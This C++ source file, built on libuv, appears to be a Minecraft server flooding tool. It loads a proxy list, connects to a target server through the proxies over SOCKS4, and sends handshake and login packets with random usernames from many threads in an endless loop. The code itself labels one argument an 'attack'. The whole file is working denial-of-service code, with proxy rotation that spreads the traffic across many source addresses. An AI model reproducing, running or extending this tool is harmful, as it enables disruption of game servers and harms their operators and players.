#include <netinet/in.h>
#include <sys/socket.h>
#include <uv.h>

#include <algorithm>
#include <csignal>
#include <fstream>
#include <iostream>
#include <mutex>
#include <sstream>
#include <thread>

#include "byte_buffer.h"
#include "packet/handshake.h"
#include "packet/login_start.h"

std::vector<sockaddr_in> proxies;
int current = 0;
std::mutex proxyMutex;

ByteBuffer buf;
ByteBuffer proxyConnect;
int protocol;

std::string random_string(size_t length) {
  auto randchar = []() -> char {
    const char charset[] =
        "0123456789"
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz";
    const size_t max_index = (sizeof(charset) - 1);
    return charset[rand() % max_index];
  };
  std::string str(length, 0);
  std::generate_n(str.begin(), length, randchar);
  return str;
}

void write(uv_stream_t* stream, const ByteBuffer& buf) {
  uv_buf_t uvBuf[] = {{.base = (char*) buf.data.data(), .len = buf.length()}};
  auto* req = (uv_write_t*) malloc(sizeof(uv_write_t));
  uv_write(req, stream, uvBuf, 1, [](uv_write_t* req, int s) {
    if (s < 0) {
      std::cerr << "Каннот сенд дата ту зе сервер" << std::endl;
    }
    free(req);
  });
}

void makeConnection(uv_loop_t* loop) {
  proxyMutex.lock();
  sockaddr_in dstAddr = proxies[current++];
  if (current >= proxies.size()) {
    current = 0;
  }
  proxyMutex.unlock();

  auto* psock = (uv_tcp_t*) malloc(sizeof(uv_tcp_t));
  uv_tcp_init(loop, psock);

  auto* conn = (uv_connect_t*) malloc(sizeof(uv_connect_t));
  uv_tcp_connect(conn, psock,
                 (const sockaddr*) &dstAddr, [](uv_connect_t* con, int s) {
                   makeConnection(con->handle->loop);
                   if (s < 0) {
                     std::cerr << "Каннот коннект ту зе прокси сервер" << std::endl;
                     return;
                   }
                   //                   std::cout << "Коннектед ту зе сервер" << std::endl;

                   uv_stream_t* stream = con->handle;
                   free(con);

                   write(stream, proxyConnect);

                   uv_read_start(
                       stream,
                       [](uv_handle_t*, size_t s, uv_buf_t* b) {
                         *b = uv_buf_init((char*) malloc(s), s);
                       },
                       [](uv_stream_t* stream, ssize_t nread, const uv_buf_t* b) {
                         if (nread < 0) {
                           uv_close((uv_handle_t*) stream, [](uv_handle_t* h) {
                             std::cout << "Дисконнектед фром зе сервер" << std::endl;
                             free(h);
                           });
                         } else {
                           if (b->base[1] != 90) {
                             std::cerr << "Реквест хас бин режектед бай прокси сервер виз коде " << (int) b->base[1] << std::endl;
                           } else {
                             ByteBuffer login;
                             LoginStart(protocol, random_string(10)).writeWrapped(login);

                             write(stream, buf);
                             write(stream, login);

                             uv_close((uv_handle_t*) stream, [](uv_handle_t* h) {
                               std::cout << "Дисконнектед фром зе сервер" << std::endl;
                               free(h);
                             });
                           }
                         }

                         free(b->base);
                       });
                 });
}

void splitIP(const std::string& source, std::string& ip, int& port) {
  std::stringstream ss;
  ss << source;
  getline(ss, ip, ':');
  ss >> port;
  if (port == 0) {
    port = 25565;
  }
}

int main(int argc, char** argv) {
  if (argc < 5) {
    std::cerr << "Нот энаугхт аргументс!!11!" << std::endl;
    exit(-1);
  }

  const char* proxiesPath = "proxies.txt";
  const int loopCnt = atoi(argv[4]);
  protocol = atoi(argv[3]);
  // argv[2] = attack; (TODO: Implement attacks)
  std::string ip;
  int port;
  splitIP(argv[1], ip, port);

  std::cout << ip << " " << port << std::endl;

  std::ifstream proxiesFile(proxiesPath);
  if (!proxiesFile.good()) {
    std::cerr << "Каннот рид проксиес фром файл " << proxiesPath << std::endl;
    exit(-1);
  }
  std::string s;
  while (getline(proxiesFile, s)) {
    std::string proxyIp;
    int proxyPort;
    splitIP(s, proxyIp, proxyPort);

    sockaddr_in proxy {};
    uv_ip4_addr(proxyIp.c_str(), proxyPort, &proxy);
    proxies.push_back(proxy);
  }
  if (proxies.empty()) {
    std::cerr << "Каннот лоад проксиес!! Файл из емпти!" << std::endl;
    exit(-1);
  }

  Handshake(protocol, ip, port, Handshake::LOGIN).writeWrapped(buf);

  /*
   * +----+----+----+----+----+----+----+----+----+----+....+----+
   * | VN | CD | DSTPORT |      DSTIP        | USERID       |NULL|
   * +----+----+----+----+----+----+----+----+----+----+....+----+
   *    1    1      2              4           variable       1
   */

  unsigned short a, b, c, d;
  sscanf(ip.c_str(), "%hu.%hu.%hu.%hu", &a, &b, &c, &d);

  proxyConnect.writeByte(4);                //      VN ; version number
  proxyConnect.writeByte(1);                //      CD ; command code
  proxyConnect.writeShort((short) port);    // DSTPORT ; port
  proxyConnect.writeByte((unsigned char) a);//   DSTIP ; ip
  proxyConnect.writeByte((unsigned char) b);
  proxyConnect.writeByte((unsigned char) c);
  proxyConnect.writeByte((unsigned char) d);
  proxyConnect.writeByte(0);//    NULL ; null

  signal(SIGPIPE, SIG_IGN);// Ignore SIGPIPE =)

  for (int i = 0; i < loopCnt; i++) {
    std::thread([=]() {
      auto* loop = (uv_loop_t*) malloc(sizeof(uv_loop_t));
      uv_loop_init(loop);

      makeConnection(loop);

      uv_run(loop, UV_RUN_DEFAULT);
      free(loop);
    }).detach();
  }

  while (true)
    ;
}